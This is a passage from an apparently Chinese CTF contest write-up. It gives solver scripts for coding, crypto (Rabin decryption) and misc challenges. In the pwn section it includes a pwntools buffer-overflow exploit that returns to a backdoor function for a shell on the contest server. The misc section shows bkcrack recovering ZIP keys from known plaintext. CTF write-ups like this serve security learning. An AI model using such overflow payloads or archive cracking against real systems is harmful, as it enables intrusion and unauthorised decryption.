class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="comment"># 找最后一行纯数字</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">reversed</span>(block.splitlines()):</span><br><span class="line">                <span class="keyword">if</span> line.lstrip(<span class="string">&#x27;-&#x27;</span>).isdigit():</span><br><span class="line">                    ans = <span class="built_in">str</span>(is_palindrome(<span class="built_in">int</span>(line)))</span><br><span class="line">                    s.sendall((ans + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            buf = tail            <span class="comment"># 剩余内容留到下次</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接结束，打印完整回显</span></span><br><span class="line">    <span class="built_in">print</span>(full.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="最长"><a class="header-anchor" href="#最长">¶</a>最长</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    host = <span class="string">&quot;challenge.qsnctf.com&quot;</span></span><br><span class="line">    port = <span class="number">52323</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建连接</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">20</span>)  <span class="comment"># 20秒超时</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在连接到 <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收欢迎信息</span></span><br><span class="line">    welcome = sock.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 服务器欢迎信息:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(welcome)</span><br><span class="line">    </span><br><span class="line">    round_count = <span class="number">1</span></span><br><span class="line">    buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 接收数据</span></span><br><span class="line">            data = sock.recv(<span class="number">4096</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            buffer += data</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 接收到的数据 (<span class="subst">&#123;round_count&#125;</span>):&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 尝试匹配字符串数组</span></span><br><span class="line">            pattern = <span class="string">r&#x27;\[(.*?)\]&#x27;</span></span><br><span class="line">            matches = re.findall(pattern, buffer, re.DOTALL)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">and</span> <span class="built_in">any</span>(c.isalpha() <span class="keyword">for</span> c <span class="keyword">in</span> <span class="keyword">match</span>):</span><br><span class="line">                    <span class="comment"># 清理和解析数组</span></span><br><span class="line">                    array_str = <span class="keyword">match</span>.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                    array_str = array_str.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> array_str:</span><br><span class="line">                        strings = array_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[*] 解析到的字符串: <span class="subst">&#123;strings&#125;</span>&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> strings <span class="keyword">and</span> strings[<span class="number">0</span>]:</span><br><span class="line">                            <span class="comment"># 计算最长公共前缀</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="keyword">not</span> strings:</span><br><span class="line">                                lcp = <span class="string">&quot;&quot;</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="comment"># 排序并比较</span></span><br><span class="line">                                strings.sort()</span><br><span class="line">                                first = strings[<span class="number">0</span>]</span><br><span class="line">                                last = strings[-<span class="number">1</span>]</span><br><span class="line">                                </span><br><span class="line">                                lcp = <span class="string">&quot;&quot;</span></span><br><span class="line">                                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(<span class="built_in">len</span>(first), <span class="built_in">len</span>(last))):</span><br><span class="line">                                    <span class="keyword">if</span> first[i] == last[i]:</span><br><span class="line">                                        lcp += first[i]</span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        <span class="keyword">break</span></span><br><span class="line">                            </span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;[*] 计算出的最长公共前缀: &#x27;<span class="subst">&#123;lcp&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            <span class="comment"># 发送答案</span></span><br><span class="line">                            sock.send((lcp + <span class="string">&quot;\n&quot;</span>).encode())</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;[&gt;] 已发送答案: &#x27;<span class="subst">&#123;lcp&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            round_count += <span class="number">1</span></span><br><span class="line">                            buffer = <span class="string">&quot;&quot;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查结束条件</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Bye!&quot;</span> <span class="keyword">in</span> buffer <span class="keyword">or</span> <span class="string">&quot;Time limit exceeded&quot;</span> <span class="keyword">in</span> buffer:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 服务器结束连接&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 连接超时&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 用户中断&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 连接已关闭&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<h2 id="上下火车-v2"><a class="header-anchor" href="#上下火车-v2">¶</a>上下火车</h2>
<p>一列火车从始发站开出，沿途经过若干车站。由于售票系统的故障，车站的统计逻辑变得非常古怪。你作为应急响应小组的一员，需要接入系统的远程终端，在规定时间内计算出指定车站开出时车上的人数。<br>
列车运行规则：<br>
第 1 站（始发站）： 上车人数为 a，无人下车。<br>
第 2 站： 有 u 人上车，同时有 u 人下车。离开本站时，车上人数保持为 a 。<br>
第 3 站起（至第 n-1 站）：<br>
上车人数： 等于前两站“上车人数”之和。<br>
下车人数： 等于上一站的“上车人数”。<br>
第 n 站（终点站）： 所有人下车。已知在终点站下车的人数为m。</p>
<p>交互说明<br>
本题为交互题，你需要通过 nc 访问服务器。<br>
服务器会连续给出 100 组 随机生成的参数。<br>
每组参数包含四个整数：a（始发站人数）、n（车站总数）、m（终点站下车人数）、x（目标车站）。<br>
Round [i/100] Stations (n): 13 Initial (a): 5 Total at n-1 (m): 2392 Target station (x): 5<br>
直接发送一个整数并换行，表示第 $x$ 站开出时车上的总人数</p>
<h1>crypto</h1>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-10.png" alt="alt text"></p>
<h1>pwn</h1>
<h2 id="好多“后”门！【自己没解出来的】"><a class="header-anchor" href="#好多“后”门！【自己没解出来的】">¶</a>好多“后”门！【自己没解出来的】</h2>
<ul>
<li>此题目来源于投稿</li>
<li>找一找能getshell的真函数地址。</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-6.png" alt="alt text"><br>
动态<br>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-7.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-8.png" alt="alt text"><br>
padding = 0x90+4</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-9.png" alt="alt text"></p>
<ul>
<li>
<p>ret=0x0804858e</p>
</li>
<li>
<p>想太多</p>
</li>
<li>
<p>实际是后门函数利用</p>
</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-11.png" alt="alt text"></p>
<ul>
<li>可参考<a href="/posts/d6c104b4/#pwn36">ctfshow-pwn36</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">io=remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">52615</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x90</span>+<span class="number">4</span></span><br><span class="line">backdoor=<span class="number">0x080490ee</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*padding+p32(backdoor)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1>misc</h1>
<h2 id="哦【解到图片】"><a class="header-anchor" href="#哦【解到图片】">¶</a>哦【解到图片】</h2>
<ul>
<li>原始文件 哦 的每 4 字节是反序的，重排</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-19.png" alt="alt text"></p>
<ul>
<li>bkcrack失败，手动提取了纯密文数据</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-20.png" alt="alt text"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">A:\<span class="title">ctftool</span>\<span class="title">bkcrack</span>-1.8.1-<span class="title">win64</span>\<span class="title">bkcrack</span>-1.8.1-<span class="title">win64</span>&gt;<span class="title">bkcrack</span> -<span class="title">c</span> 1.<span class="title">bin</span> -<span class="title">p</span> <span class="title">png.bin</span> -<span class="title">o</span> 0</span></span><br><span class="line"><span class="function"><span class="title">bkcrack</span> 1.8.1 - 2025-10-25</span></span><br><span class="line"><span class="function">[08:57:33] <span class="title">Z</span> <span class="title">reduction</span> <span class="title">using</span> 8 <span class="title">bytes</span> <span class="title">of</span> <span class="title">known</span> <span class="title">plaintext</span></span></span><br><span class="line"><span class="function">100.0 % (8 / 8)</span></span><br><span class="line"><span class="function">[08:57:33] <span class="title">Attack</span> <span class="title">on</span> 864713 <span class="title">Z</span> <span class="title">values</span> <span class="title">at</span> <span class="title">index</span> 7</span></span><br><span class="line"><span class="function"><span class="title">Keys</span>: <span class="title">d590788c</span> <span class="title">b34e73fb</span> 40<span class="title">e733d1</span></span></span><br><span class="line"><span class="function">71.6 % (619341 / 864713)</span></span><br><span class="line"><span class="function"><span class="title">Found</span> <span class="title">a</span> <span class="title">solution</span>. <span class="title">Stopping</span>.</span></span><br><span class="line"><span class="function"><span class="title">You</span> <span class="title">may</span> <span class="title">resume</span> <span class="title">the</span> <span class="title">attack</span> <span class="title">with</span> <span class="title">the</span> <span class="title">option</span>: --<span class="title">continue</span>-<span class="title">attack</span> 619341</span></span><br><span class="line"><span class="function">[08:59:42] <span class="title">Keys</span></span></span><br><span class="line"><span class="function"><span class="title">d590788c</span> <span class="title">b34e73fb</span> 40<span class="title">e733d1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">A</span>:\<span class="title">ctftool</span>\<span class="title">bkcrack</span>-1.8.1-<span class="title">win64</span>\<span class="title">bkcrack</span>-1.8.1-<span class="title">win64</span>&gt;<span class="title">bkcrack</span> -<span class="title">c</span> 1.<span class="title">bin</span> -<span class="title">k</span> <span class="title">d590788c</span> <span class="title">b34e73fb</span> 40<span class="title">e733d1</span> -<span class="title">d</span> <span class="title">a.png</span></span></span><br><span class="line"><span class="function"><span class="title">bkcrack</span> 1.8.1 - 2025-10-25</span></span><br><span class="line"><span class="function">[09:02:01] <span class="title">Writing</span> <span class="title">deciphered</span> <span class="title">data</span> <span class="title">a.png</span></span></span><br><span class="line"><span class="function"><span class="title">Wrote</span> <span class="title">deciphered</span> <span class="title">data</span>.</span></span><br></pre></td></tr></table></figure>
<ul>
<li>foremost</li>
<li>双图盲水印：<code>python3 bwmforpy3.py decode 1.png 2.png wm_out_py3.png</code></li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-12.png" alt="alt text"></p>
<h2 id="没坏的压缩包"><a class="header-anchor" href="#没坏的压缩包">¶</a>没坏的压缩包</h2>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-1.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-2.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-3.png" alt="alt text"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-4.png" alt="alt text"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;# Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="string"># Internal filename: ezpy.py</span></span><br><span class="line"><span class="string"># Bytecode version: 3.8.0rc1+ (3413)</span></span><br><span class="line"><span class="string"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def check_flag(flag):</span></span><br><span class="line"><span class="string">    if not flag.startswith(&#x27;flag&#123;&#x27;) or not flag.endswith(&#x27;&#125;&#x27;):</span></span><br><span class="line"><span class="string">        return False</span></span><br><span class="line"><span class="string">    core = flag[5:-1]</span></span><br><span class="line"><span class="string">    key = [19, 55, 66, 102]</span></span><br><span class="line"><span class="string">    enc = []</span></span><br><span class="line"><span class="string">    for i, c in enumerate(core):</span></span><br><span class="line"><span class="string">        enc.append(ord(c) ^ key[i % len(key)])</span></span><br><span class="line"><span class="string">    target = [118, 91, 53, 1, 117, 86, 48, 19]</span></span><br><span class="line"><span class="string">    return enc == target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    user_input = input(&#x27;Input your flag: &#x27;).strip()</span></span><br><span class="line"><span class="string">    if check_flag(user_input):</span></span><br><span class="line"><span class="string">        print(&#x27;Correct! 🎉&#x27;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&#x27;Wrong flag ❌&#x27;)</span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    main()&#x27;&#x27;&#x27;</span></span><br><span class="line">target = [<span class="number">118</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">117</span>, <span class="number">86</span>, <span class="number">48</span>, <span class="number">19</span>]</span><br><span class="line">key = [<span class="number">19</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">102</span>]</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(target):</span><br><span class="line">    enc.append(<span class="built_in">chr</span>(c ^ key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment">#[&#x27;e&#x27;, &#x27;l&#x27;, &#x27;w&#x27;, &#x27;g&#x27;, &#x27;f&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;u&#x27;]</span></span><br><span class="line"><span class="comment">#flag&#123;elwgfaru&#125;</span></span><br></pre></td></tr></table></figure>
<h1>crypto</h1>
<h2 id="Four-Ways-to-the-Truth"><a class="header-anchor" href="#Four-Ways-to-the-Truth">¶</a>Four Ways to the Truth</h2>
<p>题目信息</p>
<ul>
<li><strong>题目名称</strong>: Four Ways to the Truth</li>
<li><strong>类型</strong>: Crypto (密码学)</li>
<li><strong>给定参数</strong>:
<ul>
<li><code>p</code> (大素数)</li>
<li><code>q</code> (大素数)</li>
<li><code>e = 2</code></li>
<li><code>c</code> (密文)</li>
</ul>
</li>
<li><strong>提示</strong>: “并非所有缺失的参数都是真正“缺失”的” (Not all missing parameters are truly “missing”)</li>
</ul>
<p>原理分析：Rabin 密码体制</p>
<p>题目中给出了 $e=2$，这非常典型地指向了 <strong>Rabin 密码体制</strong>。</p>
<p>Rabin 密码体制是一种基于模平方根难度的非对称加密算法。其安全性依赖于分解大整数 $n$ ($n=pq$) 的困难性。</p>
<p>加密过程<br>
给定公钥 $n$ ($n = p \times q$)，明文 $m$ (其中 $m &lt; n$) 的加密过程为：<br>
$$ c \equiv m^2 \pmod n $$</p>
<p>解密过程<br>
解密需要私钥 $p$ 和 $q$。解密过程本质上是求解模 $n$ 的二次同余方程：<br>
$$ x^2 \equiv c \pmod n $$</p>
<p>由于 $n = p \times q$，我们可以分别求解：</p>
<ol>
<li>$x^2 \equiv c \pmod p$</li>
<li>$x^2 \equiv c \pmod q$</li>
</ol>
<p>得到 $m_p$ 和 $m_q$ 后，利用 <strong>中国剩余定理 (CRT)</strong> 将其组合，可以得到模 $n$ 下的四个解。这也是题目名称 “Four Ways to the Truth” 的含义——方程有四个根，其中一个是真正的明文。</p>
<p>解题步骤</p>
<ol>
<li>求解模 $p$ 和模 $q$ 的平方根</li>
</ol>
<p>首先检查 $p$ 和 $q$ 的性质。在本题中，计算发现：<br>
$$ p \equiv 3 \pmod 4 $$<br>
$$ q \equiv 3 \pmod 4 $$</p>
<p>对于满足 $p \equiv 3 \pmod 4$ 的素数，求平方根有简便公式：<br>
$$ m_p \equiv c^{(p+1)/4} \pmod p $$<br>
$$ m_q \equiv c^{(q+1)/4} \pmod q $$</p>
<ol start="2">
<li>使用中国剩余定理 (CRT) 组合解</li>
</ol>
<p>我们有以下同余方程组：<br>
$$<br>
\begin{cases}<br>
x \equiv \pm m_p \pmod p \<br>
x \equiv \pm m_q \pmod q<br>
\end{cases}<br>
$$</p>
<p>组合 $(m_p, m_q)$, $(m_p, -m_q)$, $(-m_p, m_q)$, $(-m_p, -m_q)$ 四种情况。</p>
<p>利用扩展欧几里得算法求出 $p$ 和 $q$ 的系数 $y_p, y_q$，使得：<br>
$$ y_p \cdot p + y_q \cdot q = 1 $$</p>
<p>通解公式为：<br>
$$ x = (y_q \cdot q \cdot (\pm m_p) + y_p \cdot p \cdot (\pm m_q)) \pmod n $$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = extended_gcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">legendre_symbol</span>(<span class="params">a, p</span>):</span><br><span class="line">    ls = <span class="built_in">pow</span>(a, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span> <span class="keyword">if</span> ls == p - <span class="number">1</span> <span class="keyword">else</span> ls</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modular_sqrt</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Find a quadratic residue (mod p) of &#x27;a&#x27;. p</span></span><br><span class="line"><span class="string">        must be an odd prime.</span></span><br><span class="line"><span class="string">        Ref: Tonelli-Shanks algorithm</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> legendre_symbol(a, p) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> p == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">elif</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(a, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># p % 4 == 1</span></span><br><span class="line">    s = p - <span class="number">1</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">        e += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    n = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> legendre_symbol(n, p) != -<span class="number">1</span>:</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    x = <span class="built_in">pow</span>(a, (s + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">    b = <span class="built_in">pow</span>(a, s, p)</span><br><span class="line">    g = <span class="built_in">pow</span>(n, s, p)</span><br><span class="line">    r = e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t = b</span><br><span class="line">        m = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t = <span class="built_in">pow</span>(t, <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">        gs = <span class="built_in">pow</span>(g, <span class="number">2</span> ** (r - m - <span class="number">1</span>), p)</span><br><span class="line">        g = (gs * gs) % p</span><br><span class="line">        x = (x * gs) % p</span><br><span class="line">        b = (b * g) % p</span><br><span class="line">        r = m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    p = <span class="number">7843924760949873188201496026705455073125667712660002135887161079633254312879905501204855425456884502003894146991780856880279808965014803584494444568674087</span></span><br><span class="line">    q = <span class="number">1140962409915024811090299765305244489074219812060197521898407764373654976342197131381234656216901694745972908393258042324146363330463003052469652666554471</span></span><br><span class="line">    e = <span class="number">2</span></span><br><span class="line">    c = <span class="number">170041716912112266353311555796224814539989621875376673120238246557647197956716037204849248165596484091026430610474184173388604052966204512334147210403868840531083264816571442641437961</span></span><br><span class="line">    </span><br><span class="line">    n = p * q</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p % 4 = <span class="subst">&#123;p % <span class="number">4</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;q % 4 = <span class="subst">&#123;q % <span class="number">4</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate square roots modulo p and q</span></span><br><span class="line">    mp = modular_sqrt(c, p)</span><br><span class="line">    mq = modular_sqrt(c, q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> mp == <span class="number">0</span> <span class="keyword">and</span> legendre_symbol(c, p) != <span class="number">1</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span 